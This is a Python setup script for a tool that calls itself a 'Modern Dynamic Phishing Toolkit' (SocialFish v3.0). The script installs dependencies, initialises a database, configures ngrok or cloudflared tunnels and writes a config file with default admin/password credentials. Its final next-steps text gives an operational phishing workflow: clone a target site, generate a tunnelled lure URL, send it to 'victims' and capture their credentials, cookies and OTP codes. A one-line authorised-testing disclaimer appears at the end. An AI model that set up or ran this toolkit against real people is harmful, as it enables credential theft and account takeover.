#!/usr/bin/env python3
"""
SocialFish v3.0 Setup & Initialization Script
Handles dependency installation, database migration, and configuration
"""

import os
import sys
import subprocess
from pathlib import Path

def print_banner():
    print("""
    ╔═══════════════════════════════════════════╗
    ║     SocialFish v3.0 Setup Wizard          ║
    ║     Modern Dynamic Phishing Toolkit       ║
    ╚═══════════════════════════════════════════╝
    """)

def check_python():
    """Verify Python 3.8+"""
    if sys.version_info < (3, 8):
        print("[-] Python 3.8+ required")
        exit(1)
    print(f"[+] Python {sys.version.split()[0]} ✓")

def install_dependencies():
    """Install required packages"""
    print("\n[*] Installing dependencies...")
    
    deps = [
        'flask==2.3.3',
        'flask-socketio>=5.3.0',
        'eventlet>=0.33.3',
        'playwright>=1.40.0',
        'pyngrok>=7.0.0',
        'python-dotenv>=1.0.0',
        'cryptography>=41.0.0',
        'selenium>=4.13.0',
        'webdriver-manager>=4.0.0'
    ]
    
    for dep in deps:
        try:
            __import__(dep.split('>=')[0].split('==')[0].replace('-', '_'))
            print(f"[+] {dep.split('>=')[0]} already installed")
        except ImportError:
            print(f"[*] Installing {dep}...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', dep], check=True)
    
    print("[+] All dependencies installed ✓")

def install_playwright_browsers():
    """Install Playwright browsers"""
    print("\n[*] Installing Playwright browsers...")
    print("    (This may take a few minutes)")
    
    try:
        from playwright.sync_api import sync_playwright
        subprocess.run([sys.executable, '-m', 'playwright', 'install', 'chromium'], check=True)
        print("[+] Chromium browser installed ✓")
    except Exception as e:
        print(f"[-] Failed to install Playwright browsers: {e}")
        print("[!] You can manually run: playwright install chromium")

def initialize_database():
    """Initialize database schema"""
    print("\n[*] Initializing database...")
    
    try:
        from core.db_migration import migrate_db
        db_path = os.getenv("DATABASE", "./database.db")
        migrate_db(db_path)
        print(f"[+] Database initialized: {db_path} ✓")
    except Exception as e:
        print(f"[-] Database initialization failed: {e}")
        return False
    
    return True

def setup_tunneling():
    """Interactive tunnel setup"""
    print("\n[*] Tunnel Setup (Optional)")
    print("You can setup tunneling now or skip for local testing.")
    
    choice = input("\nSetup tunneling? (ngrok/cloudflared/skip) [skip]: ").strip().lower()
    
    if choice in ['ngrok', 'cloudflared']:
        try:
            from core.tunnel_manager import TunnelManager
            manager = TunnelManager()
            manager.interactive_setup()
            print("[+] Tunnel configured ✓")
        except Exception as e:
            print(f"[-] Tunnel setup failed: {e}")
    else:
        print("[!] Using localhost only. You can setup tunneling later with:")
        print("    python core/tunnel_manager.py setup")

def generate_config():
    """Create .env file if needed"""
    env_file = Path(".env")
    if not env_file.exists():
        print("\n[*] Creating .env configuration...")
        env_content = """# SocialFish v3.0 Configuration
DATABASE=./database.db
FLASK_ENV=development
FLASK_DEBUG=0
SECRET_KEY=change-me-to-random-string

# Tunneling
NGROK_TOKEN=
CLOUDFLARED_TOKEN=

# Webhook
WEBHOOK_TIMEOUT=5
"""
        env_file.write_text(env_content)
        print("[+] .env file created (configure as needed) ✓")

def print_next_steps():
    """Print quick-start guide"""
    print("""
╔═══════════════════════════════════════════╗
║        Setup Complete! Next Steps:        ║
╚═══════════════════════════════════════════╝

1. Start the application:
   python SocialFish.py admin password

2. Access the web interface:
   http://localhost:5000/neptune
   
   Username: admin
   Password: password

3. Create your first template:
   - Go to /templates
   - Click "New Template"
   - Enter target URL
   - Choose cloning options
   - System will record the flow

4. Generate a lure URL:
   - Select template
   - Click "Lure" → "Tunnel"
   - Choose tunneling method
   - Copy generated URL

5. Send to victims:
   - Distribute lure URL
   - Monitor sessions in real-time
   - Capture credentials, cookies, OTP codes

For detailed documentation, see: FEATURES_v3.md

⚠️ Remember: Only test systems you own or have explicit permission to test.

    """)

def main():
    print_banner()
    check_python()
    
    try:
        install_dependencies()
        install_playwright_browsers()
        if initialize_database():
            setup_tunneling()
            generate_config()
            print_next_steps()
        else:
            print("[-] Setup incomplete. Try manual database setup:")
            print("    python core/db_migration.py")
    except KeyboardInterrupt:
        print("\n[-] Setup cancelled")
        exit(1)
    except Exception as e:
        print(f"\n[-] Setup error: {e}")
        exit(1)

if __name__ == "__main__":
    main()
